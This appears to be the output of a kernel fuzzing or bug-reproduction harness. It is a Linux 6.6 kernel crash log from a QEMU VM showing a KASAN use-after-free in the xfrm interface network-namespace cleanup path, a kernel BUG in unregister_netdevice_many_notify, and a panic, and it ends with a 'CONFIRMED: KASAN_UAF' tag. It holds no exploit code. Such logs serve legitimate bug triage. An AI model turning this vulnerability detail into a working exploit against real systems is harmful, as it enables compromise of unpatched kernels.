[    1.205916]  do_syscall_64+0x38/0x80
[    1.206117]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
[    1.206393] 
[    1.206486] The buggy address belongs to the object at ffff88800986e000
[    1.206486]  which belongs to the cache kmalloc-4k of size 4096
[    1.207186] The buggy address is located 2312 bytes inside of
[    1.207186]  freed 4096-byte region [ffff88800986e000, ffff88800986f000)
[    1.207931] 
[    1.208037] The buggy address belongs to the physical page:
[    1.208383] page:0000000018c3c193 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9868
[    1.208942] head:0000000018c3c193 order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.209436] flags: 0x100000000000840(slab|head|node=0|zone=1)
[    1.209792] page_type: 0xffffffff()
[    1.210015] raw: 0100000000000840 ffff888006842140 dead000000000122 0000000000000000
[    1.210489] raw: 0000000000000000 0000000000040004 00000001ffffffff 0000000000000000
[    1.210959] page dumped because: kasan: bad access detected
[    1.211305] 
[    1.211411] Memory state around the buggy address:
[    1.211709]  ffff88800986e800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.212154]  ffff88800986e880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.212546] >ffff88800986e900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.212870]                       ^
[    1.213033]  ffff88800986e980: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.213359]  ffff88800986ea00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.213683] ==================================================================
[    1.214015] Disabling lock debugging due to kernel taint
[    1.214271] ------------[ cut here ]------------
[    1.214487] kernel BUG at net/core/dev.c:11041!
[    1.214699] invalid opcode: 0000 [#1] PREEMPT SMP KASAN NOPTI
[    1.214961] CPU: 0 PID: 11 Comm: kworker/u4:0 Tainted: G    B              6.6.100-g2e18442d22c6-dirty #1
[    1.215387] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.215812] Workqueue: netns cleanup_net
[    1.215995] RIP: 0010:unregister_netdevice_many_notify+0x23d/0x1380
[    1.216280] Code: 0d 00 00 4c 89 e0 4d 89 67 08 48 c1 e8 03 42 80 3c 28 00 0f 85 c1 0d 00 00 4d 89 3c 24 48 89 4b 60 48 89 53 68 e9 32 ff ff ff <0f> 0b 48 b8 00 00 00 00 00 fc ff df 4c 89 c2 48 c1 ea 03 80 3c 02
[    1.217099] RSP: 0018:ffffc900000bfb28 EFLAGS: 00010206
[    1.217336] RAX: 0000000000000000 RBX: ffff88800986e000 RCX: dead000000000100
[    1.217656] RDX: dead000000000122 RSI: 0000000000000001 RDI: ffffc900000bfaf0
[    1.217976] RBP: ffff88800989c000 R08: ffffc900000bfc68 R09: fffffbfff0a4d500
[    1.218278] R10: ffffffff8526a807 R11: 6e696c6261736944 R12: 0000000000000004
[    1.218554] R13: dffffc0000000000 R14: ffffc900000bfba0 R15: ffff88800986e060
[    1.218829] FS:  0000000000000000(0000) GS:ffff88806d000000(0000) knlGS:0000000000000000
[    1.219142] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.219368] CR2: 0000000000579304 CR3: 0000000005c0a003 CR4: 0000000000770ef0
[    1.219645] PKRU: 55555554
[    1.219755] Call Trace:
[    1.219857]  <TASK>
[    1.219947]  ? __pfx_unregister_netdevice_many_notify+0x10/0x10
[    1.220180]  ? unregister_netdevice_queue+0x256/0x280
[    1.220379]  ? __pfx_unregister_netdevice_queue+0x10/0x10
[    1.220591]  xfrmi_exit_batch_net+0x1d8/0x290
[    1.220765]  ? __pfx_xfrmi_exit_batch_net+0x10/0x10
[    1.220959]  ? xt_find_table+0x12b/0x170
[    1.221117]  cleanup_net+0x44a/0xab0
[    1.221261]  ? __pfx_cleanup_net+0x10/0x10
[    1.221424]  ? __pfx___schedule+0x10/0x10
[    1.221583]  ? _raw_spin_lock_irq+0x81/0xe0
[    1.221750]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    1.221937]  process_one_work+0x58e/0xe60
[    1.222100]  worker_thread+0x85c/0x15c0
[    1.222254]  ? __pfx_worker_thread+0x10/0x10
[    1.222425]  kthread+0x29b/0x370
[    1.222557]  ? __pfx_kthread+0x10/0x10
[    1.222707]  ret_from_fork+0x2f/0x70
[    1.222853]  ? __pfx_kthread+0x10/0x10
[    1.223004]  ret_from_fork_asm+0x1b/0x30
[    1.223163]  </TASK>
[    1.223255] Modules linked in:
[    1.223384] ---[ end trace 0000000000000000 ]---
[    1.223567] RIP: 0010:unregister_netdevice_many_notify+0x23d/0x1380
[    1.223812] Code: 0d 00 00 4c 89 e0 4d 89 67 08 48 c1 e8 03 42 80 3c 28 00 0f 85 c1 0d 00 00 4d 89 3c 24 48 89 4b 60 48 89 53 68 e9 32 ff ff ff <0f> 0b 48 b8 00 00 00 00 00 fc ff df 4c 89 c2 48 c1 ea 03 80 3c 02
[    1.224525] RSP: 0018:ffffc900000bfb28 EFLAGS: 00010206
[    1.224730] RAX: 0000000000000000 RBX: ffff88800986e000 RCX: dead000000000100
[    1.225007] RDX: dead000000000122 RSI: 0000000000000001 RDI: ffffc900000bfaf0
[    1.225284] RBP: ffff88800989c000 R08: ffffc900000bfc68 R09: fffffbfff0a4d500
[    1.225564] R10: ffffffff8526a807 R11: 6e696c6261736944 R12: 0000000000000004
[    1.225842] R13: dffffc0000000000 R14: ffffc900000bfba0 R15: ffff88800986e060
[    1.226120] FS:  0000000000000000(0000) GS:ffff88806d000000(0000) knlGS:0000000000000000
[    1.226436] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.226661] CR2: 0000000000579304 CR3: 0000000005c0a003 CR4: 0000000000770ef0
[    1.226939] PKRU: 55555554
[    1.227050] Kernel panic - not syncing: Fatal exception
[    1.227299] Kernel Offset: disabled
CONFIRMED: KASAN_UAF
